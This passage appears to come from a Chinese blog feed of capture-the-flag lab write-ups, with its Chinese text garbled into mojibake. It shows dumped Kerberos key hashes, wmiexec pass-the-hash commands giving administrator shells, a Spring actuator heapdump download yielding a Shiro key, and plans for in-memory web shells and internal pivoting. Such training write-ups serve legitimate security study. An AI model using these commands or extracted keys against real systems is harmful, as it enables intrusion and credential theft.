aes128-cts-hmac-sha1-96:4ce9f8c194b606feca44d2c84a8b3215\nwangkai: des-cbc-md5: e9ec9bb95b514902\nyangyan: aes256-cts-hmac-sha1-96: e5c045bcb69ef53b66405645764f811b55909c2f67e3b9c5c816e584711206ba\nyangyan: aes128-cts-hmac-sha1-96: b5b5780c2b9014223fff940e2d0ddb99\nyangyan: des-cbc-md5: f2ae7ccb756d2c20\nzhangxin: aes256-cts-hmac-sha1-96:06f75e8f90bff7ef536d682da9ce719c235d54d4660936aaf71499859960e8b3\nzhangxin: aes128-cts-hmac-sha1-96: fdb55e032fd0647f4519e225544b3de6\nzhangxin: des-cbc-md5: df67d6b59d106710\nwangping: aes256-cts-hmac-sha1-96: d0c1d5bf581d866b7a57c4b75d8dccf2d996d0f91226cd13dae1ebad02c220e0\nwangping: aes128-cts-hmac-sha1-96: db24cb50818548f0d70ff12b7e94e5bf\nwangping: des-cbc-md5: e31c10866b6e1af1\nDC$: aes256-cts-hmac-sha1-96:2177cba61e6bef5c2358728bbd38fcf555a385ca2bc21a7bee0eb7082bc43009\nDC$: aes128-cts-hmac-sha1-96:2a93500066caecc8ca1fd443dfe71045\nDC$: des-cbc-md5: d99d163738d0514a\nPC1$: aes256-cts-hmac-sha1-96:6f9ab6bbf92b25ffc47a2e2e4d02611810153ed1f638ad0661a1c2ba6a44c35b\nPC1$: aes128-cts-hmac-sha1-96: a332459ac3ed4676081045169db6642f\nPC1$: des-cbc-md5: c1bf253e7abcfe3e\nFILESERVER$: aes256-cts-hmac-sha1-96:3c57a20b8c4506d147055c344c6a1b029ad98df9885950b4962a5da1d737bf81\nFILESERVER$: aes128-cts-hmac-sha1-96: e199679dc0624225beb20d195bcebf89\nFILESERVER$: des-cbc-md5: cb98a7ce7043a7ba\ntest1$: aes256-cts-hmac-sha1-96:12d38e3177a4f263be6da2f3ec99357341205fc563c165866aee4a6d46f55801\ntest1$: aes128-cts-hmac-sha1-96:87646137635d8377a3558ed890818c8e\ntest1$: des-cbc-md5: b561234070166d9b\nlv$: aes256-cts-hmac-sha1-96: b5e3de41bfde0550d7c122c2521ccdf1f071679d01823c8e7a3102bd060ae9ef\nlv$: aes128-cts-hmac-sha1-96: bd32120973f173a6aea2d174072dffb1\nlv$: des-cbc-md5:38e397adbc027f4c\nevailpc$: aes256-cts-hmac-sha1-96:9d216633c05f405b584a68b418250a99c47de5afaa8261cbaa85e71c1a450b38\nevailpc$: aes128-cts-hmac-sha1-96:7d88d455f095e199cc2a9b97ce72b38c\nevailpc$: des-cbc-md5:8664376ea2cb5280\nll$: aes256-cts-hmac-sha1-96:2ee5b4caa01084d7cefb60fce5daa2bb35e2c06bdb4b56516b0d5f1f926819df\nll$: aes128-cts-hmac-sha1-96:5db4f55cb677946d95a74a19df68ab44\nll$: des-cbc-md5: d37615076e451ca8\nTEST2$: aes256-cts-hmac-sha1-96:6fad46be8d54b5431df61db10866c987d2c64ff528419ec0ee7f7a38d6e7ee6f\nTEST2$: aes128-cts-hmac-sha1-96:476a93fc85b66f3861e3b51e39f3b8d0\nTEST2$: des-cbc-md5:640780a13ee357c7\n[*] Cleaning up...\n~~~\n\næ‹¿åˆ°åŸŸæ§ä¹‹åå°±æ¨ªå‘å°±å¯ä»¥äº†\n\n~~~\nwmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.15\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\nC:\\>\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.8\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\nC:\\>\n~~~\n\n","tags":["é¶æœº"],"categories":["æ˜¥ç§‹äº‘é•œ"]},{"title":"æ˜¥ç§‹äº‘é•œ-ThermalPower","url":"/2025/05/02/æ˜¥ç§‹äº‘é•œ-ThermalPower/","content":"\n# FLAG01\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# ../../pentest/fscan/fscan2 -h 39.98.122.145\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-05-01 23:10:46] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-05-01 23:10:46] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-05-01 23:10:46] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\n[2025-05-01 23:10:46] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-05-01 23:10:46] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-05-01 23:10:46] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.122.145:22\n[2025-05-01 23:10:47] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.122.145:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.9 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]\n[2025-05-01 23:10:49] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.122.145:8080\n[2025-05-01 23:10:54] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.122.145:8080 => [http]\n[2025-05-01 23:10:56] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 2\n[2025-05-01 23:10:56] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-05-01 23:10:56] [INFO] åŠ è½½çš„æ’ä»¶: ssh, webpoc, webtitle\n[2025-05-01 23:10:56] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.98.122.145:8080 çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://39.98.122.145:8080/login;jsessionid=C10B39BA0BC886E7924F52A8BA23B5B6\n[2025-05-01 23:10:57] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.98.122.145:8080/login;jsessionid=C10B39BA0BC886E7924F52A8BA23B5B6 çŠ¶ æ€ç :200 é•¿åº¦:2936   æ ‡é¢˜:ç«åˆ›èƒ½æºç›‘æ§ç”»é¢ç®¡ç†å¹³å°\n[2025-05-01 23:11:00] [SUCCESS] ç›®æ ‡: http://39.98.122.145:8080\n  æ¼æ´ç±»å‹: poc-yaml-spring-actuator-heapdump-file\n  æ¼æ´åç§°:\n  è¯¦ç»†ä¿¡æ¯:\n        author:AgeloVito\n        links:https://www.cnblogs.com/wyb628/p/8567610.html\n[2025-05-01 23:11:00] [SUCCESS] ç›®æ ‡: http://39.98.122.145:8080\n  æ¼æ´ç±»å‹: poc-yaml-springboot-env-unauth\n  æ¼æ´åç§°: spring2\n  è¯¦ç»†ä¿¡æ¯:\n        links:https://github.com/LandGrey/SpringBootVulExploit\n[2025-05-01 23:11:03] [SUCCESS] æ‰«æå·²å®Œæˆ: 3/3\n~~~\n\nå¯ä»¥æ‰«æœ‰8080ç«¯å£æœ‰ä¸€ä¸ªpoc-yaml-spring-actuator-heapdump-fileï¼Œå…ˆå°†heapdumpæ–‡ä»¶ä¸‹è½½ä¸‹æ¥\t\n\n~~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# wget  http://39.98.122.145:8080/actuator/heapdump\n--2025-05-01 23:13:13--  http://39.98.122.145:8080/actuator/heapdump\nConnecting to 39.98.122.145:8080... connected.\nHTTP request sent, awaiting response... 200\nLength: 31181349 (30M) [application/octet-stream]\nSaving to: â€˜heapdumpâ€™\n\nheapdump                      100%[=================================================>]  29.74M  1.36MB/s    in 21s\n\n2025-05-01 23:13:35 (1.41 MB/s) - â€˜heapdumpâ€™ saved [31181349/31181349]\n~~~~\n\nç„¶åç”¨å·¥å…·è¿›è¡Œåˆ†æ\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump\n===========================================\nSpringDataSourceProperties\n-------------\nnot found!\n\n===========================================\nWeblogicDataSourceConnectionPoolConfig\n-------------\nnot found!\n\n===========================================\nMongoClient\n-------------\nnot found!\n\n===========================================\nAliDruidDataSourceWrapper\n-------------\nnot found!\n\n===========================================\nHikariDataSource\n-------------\nnot found!\n\n===========================================\nRedisStandaloneConfiguration\n-------------\nnot found!\n\n===========================================\nJedisClient\n-------------\nnot found!\n\n===========================================\nCookieRememberMeManager(ShiroKey)\n-------------\nalgMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES\n\n===========================================\nOriginTrackedMapPropertySource\n-------------\nmanagement.endpoints.web.exposure.include = *\nspring.thymeleaf.encoding = UTF-8\nmanagement.endpoint.health.show-details = always\nspring.thymeleaf.cache = true\nspring.thymeleaf.content-type = text/html\nserver.port = 8080\nspring.thymeleaf.check-template = true\nmanagement.endpoints.jmx.exposure.include = *\n\n===========================================\nMutablePropertySources\n-------------\nawt.toolkit = sun.awt.X11.XToolkit\nsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\njava.protocol.handler.pkgs = org.springframework.boot.loader\nsun.management.compiler = HotSpot 64-Bit Tiered Compilers\nsun.cpu.isalist =\nsun.jnu.encoding = UTF-8\njava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08\njava.class.path = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar\npath.separator = :\njava.vm.vendor = Private Build\nos.version = 5.4.0-166-generic\njava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed\njava.runtime.name = OpenJDK Runtime Environment\nfile.encoding = UTF-8\ncatalina.useNaming = false\nspring.beaninfo.ignore = true\njava.vm.specification.version = 1.8\nos.name = Linux\njava.vm.name = OpenJDK 64-Bit Server VM\nlocal.server.port = null\nuser.country = US\njava.vendor.url.bug = http://bugreport.sun.com/bugreport/\nsun.java.command = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar\njava.io.tmpdir = /tmp\ncatalina.home = /tmp/tomcat.8080.2227855515484347988\njava.version = 1.8.0_392\nuser.home = /root\nuser.language = en\nPID = 620\njava.awt.printerjob = sun.print.PSPrinterJob\nCONSOLE_LOG_CHARSET = UTF-8\nfile.separator = /\ncatalina.base = /tmp/tomcat.8080.2227855515484347988\njava.vm.info = mixed mode\njava.specification.name = Java Platform API Specification\njava.vm.specification.vendor = Oracle Corporation\nFILE_LOG_CHARSET = UTF-8\njava.awt.graphicsenv = sun.awt.X11GraphicsEnvironment\njava.awt.headless = true\nsun.io.unicode.encoding = UnicodeLittle\njava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext\n\n===========================================\nMapPropertySources\n-------------\nlocal.server.port = null\n\n===========================================\nConsulPropertySources\n-------------\nnot found!\n\n===========================================\nJavaProperties\n-------------\njava.util.logging.FileHandler.pattern = %h/java%u.log\nawt.toolkit = sun.awt.X11.XToolkit\nsun.cpu.isalist =\nsun.jnu.encoding = UTF-8\njava.class.path = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar\njdk.security.legacyAlgorithms = SHA1, RSA keySize < 2048, DSA keySize < 2048\njava.vm.vendor = Private Build\njdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1\ncrypto.policy = unlimited\njceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*\nsun.arch.data.model = 64\nlogin.configuration.provider = sun.security.provider.ConfigFile\ncatalina.useNaming = false\nuser.timezone =\nsecurity.overridePropertiesFile = true\njava.vm.specification.version = 1.8\nos.name = Linux\nuser.country = US\nsecurity.provider.7 = com.sun.security.sasl.Provider\nsun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64\nsun.java.command = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar\nsecurity.provider.9 = sun.security.smartcardio.SunPCSC\njdk.security.caDistrustPolicies = SYMANTEC_TLS\nsun.cpu.endian = little\nuser.home = /root\nuser.language = en\njava.specification.vendor = Oracle Corporation\nen = UTF-8\nsecurity.provider.1 = sun.security.provider.Sun\nsecurity.provider.2 = sun.security.rsa.SunRsaSign\nsecurity.provider.3 = sun.security.ec.SunEC\nnetworkaddress.cache.negative.ttl = 10\njdk.tls.alpnCharset = ISO_8859_1\nsecurity.provider.4 = com.sun.net.ssl.internal.ssl.Provider\nsecurity.provider.5 = com.sun.crypto.provider.SunJCE\nsecurity.provider.6 = sun.security.jgss.SunProvider\nssl.KeyManagerFactory.algorithm = SunX509\nfile.separator = /\njava.specification.name = Java Platform API Specification\njava.vm.specification.vendor = Oracle Corporation\nFILE_LOG_CHARSET = UTF-8\n.level = INFO\njava.awt.graphicsenv = sun.awt.X11GraphicsEnvironment\nja = UTF-8\njava.awt.headless = true\ncom.xyz.foo.level = SEVERE\npackage.definition = sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.\nsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\njava.protocol.handler.pkgs = org.springframework.boot.loader\nsun.management.compiler = HotSpot 64-Bit Tiered Compilers\njava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08\npolicy.provider = sun.security.provider.PolicyFile\nuser.name = root\npolicy.url.1 = file:${java.home}/lib/security/java.policy\npath.separator = :\nfr = UTF-8\nsecurerandom.source = file:/dev/random\npolicy.url.2 = file:${user.home}/.java.policy\njdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize < 1024, EC keySize < 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurves\nos.version = 5.4.0-166-generic\njava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed\npolicy.ignoreIdentityScope = false\njava.runtime.name = OpenJDK Runtime Environment\nkeystore.type.compat = true\nfile.encoding = UTF-8\nspring.beaninfo.ignore = true\njava.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter\njava.vm.name = OpenJDK 64-Bit Server VM\njdk.sasl.disabledMechanisms =\njava.vendor.url.bug = http://bugreport.sun.com/bugreport/\njava.io.tmpdir = /tmp\njava.util.logging.FileHandler.formatter = java.util.logging.XMLFormatter\njava.util.logging.FileHandler.count = 1\ncatalina.home = /tmp/tomcat.8080.2227855515484347988\njava.version = 1.8.0_392\nsun.cds.enableSharedLookupCache = false\nsun.security.krb5.maxReferrals = 5\njdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37\nPID = 620\njava.vm.specification.name = Java Virtual Machine Specification\njava.awt.printerjob = sun.print.PSPrinterJob\nCONSOLE_LOG_CHARSET = UTF-8\njdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops\ncatalina.base = /tmp/tomcat.8080.2227855515484347988\njava.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib\njava.util.logging.FileHandler.limit = 50000\njava.vm.info = mixed mode, sharing\njava.vendor = Private Build\nkeystore.type = jks\njava.specification.maintenance.version = 5\nhandlers = java.util.logging.ConsoleHandler\nsun.io.unicode.encoding = UnicodeLittle\njava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext\npolicy.expandProperties = true\nsecurerandom.strongAlgorithms = NativePRNGBlocking:SUN\nkrb5.kdc.bad.policy = tryLast\n\n===========================================\nProcessEnvironment\n-------------\nnot found!\n\n===========================================\nOSS\n-------------\nnot found!\n\n===========================================\nUserPassSearcher\n-------------\norg.apache.shiro.web.filter.authc.FormAuthenticationFilter:\n[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]\n\norg.apache.catalina.startup.Tomcat:\n[hostname = localhost]\n\n\n===========================================\nCookieThief\n-------------\nnot found!\n\n===========================================\nAuthThief\n-------------\nnot found!\n\n===========================================\n~~~\n\næœ‰ç”¨çš„æ˜¯è¿™é‡Œï¼Œå­˜åœ¨ä¸€ä¸ªshirokeyï¼Œç„¶åshiroä¸€æŠŠæ¢­ï¼Œæ³¨å…¥å†…å­˜é©¬\n\n~~~~\n===========================================\nCookieRememberMeManager(ShiroKey)\n-------------\nalgMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES\n~~~~\n\nflag01åœ¨æ ¹ç›®å½•\n\n# FLAG02\n\nå†™ä¸€ä¸ªå…¬é’¥è¿›å»ï¼Œsshè¿æ¥ï¼Œä¸Šä¼ ä¸€ä¸ªfscanå†åšä¸€ä¸ªä»£ç†\n\nfscanæ‰«ä¸€ä¸‹å†…ç½‘\n\n~~~\nroot@security:~# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:2f:44:6e brd ff:ff:ff:ff:ff:ff\n    inet 172.22.17.213/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315359102sec preferred_lft 315359102sec\n    inet6 fe80::216:3eff:fe2f:446e/64 scope link\n       valid_lft forever preferred_lft forever\nroot@security:~# ./fscan2 -h 172.22.17.213/24\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-05-02 11:23:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-05-02 11:23:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-05-02 11:23:19] [INFO] CIDRèŒƒå›´: 172.22.17.0-172.22.17.255\n[2025-05-02 11:23:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.17.0.%!d(string=172.22.17.255) - %!s(MISSING).%!d(MISSING)\n[2025-05-02 11:23:20] [INFO] è§£æCIDR 172.22.17.213/24 -> IPèŒƒå›´ 172.22.17.0-172.22.17.255\n[2025-05-02 11:23:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\n[2025-05-02 11:23:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-05-02 11:23:20] [SUCCESS] ç›®æ ‡ 172.22.17.6     å­˜æ´» (ICMP)\n[2025-05-02 11:23:20] [SUCCESS] ç›®æ ‡ 172.22.17.213   å­˜æ´» (ICMP)\n[2025-05-02 11:23:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 2\n[2025-05-02 11:23:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:445\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:139\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:135\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:21\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:80\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.213:22\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.213:8080\n[2025-05-02 11:23:23] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.6:21 => [ftp] äº§å“:Microsoft ftpd ç³»ç»Ÿ:Windows Banner:[220 Microsoft FTP Service.]\n[2025-05-02 11:23:23] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.213:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.9 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]\n[2025-05-02 11:23:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.6:445 =>\n[2025-05-02 11:23:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.6:139 =>  Banner:[.]\n[2025-05-02 11:23:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.213:8080 => [http]\n[2025-05-02 11:23:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.6:80 => [http]\n[2025-05-02 11:24:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.6:135 =>\n[2025-05-02 11:24:28] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 7\n[2025-05-02 11:24:28] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-05-02 11:24:28] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-05-02 11:24:28] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.17.6        çŠ¶æ€ç :200 é•¿åº¦:661    æ ‡é¢˜:172.22.17.6 - /\n[2025-05-02 11:24:28] [SUCCESS] NetBios 172.22.17.6     WORKGROUP\\WIN-ENGINEER\n[2025-05-02 11:24:28] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.17.6\nä¸»æœºå: WIN-ENGINEER\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.17.6\n[2025-05-02 11:24:28] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.17.213:8080 çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://172.22.17.213:8080/login;jsessionid=AE53E4C807EB6DEB9B204E7B4201FDFF\n[2025-05-02 11:24:28] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ!\n[2025-05-02 11:24:28] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.17.213:8080/login;jsessionid=AE53E4C807EB6DEB9B204E7B4201FDFF çŠ¶ æ€ç :200 é•¿åº¦:2936   æ ‡é¢˜:ç«åˆ›èƒ½æºç›‘æ§ç”»é¢ç®¡ç†å¹³å°\n[2025-05-02 11:24:29] [SUCCESS] ç›®æ ‡: http://172.22.17.213:8080\n  æ¼æ´ç±»å‹: poc-yaml-spring-actuator-heapdump-file\n  æ¼æ´åç§°:\n  è¯¦ç»†ä¿¡æ¯:\n        author:AgeloVito\n        links:https://www.cnblogs.com/wyb628/p/8567610.html\n[2025-05-02 11:24:30] [SUCCESS] ç›®æ ‡: http://172.22.17.213:8080\n  æ¼æ´ç±»å‹: poc-yaml-springboot-env-unauth\n  æ¼æ´åç§°: spring2\n  è¯¦ç»†ä¿¡æ¯:\n        links:https://github.com/LandGrey/SpringBootVulExploit\n~~~\n\n~~~\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:445\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:139\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:135\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:21\n[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:80\n~~~\n\nå…ˆçœ‹ftpï¼Œå¯ä»¥åŒ¿åç™»é™†ä½†æ˜¯ä¸­æ–‡ä¼šä¹±ç 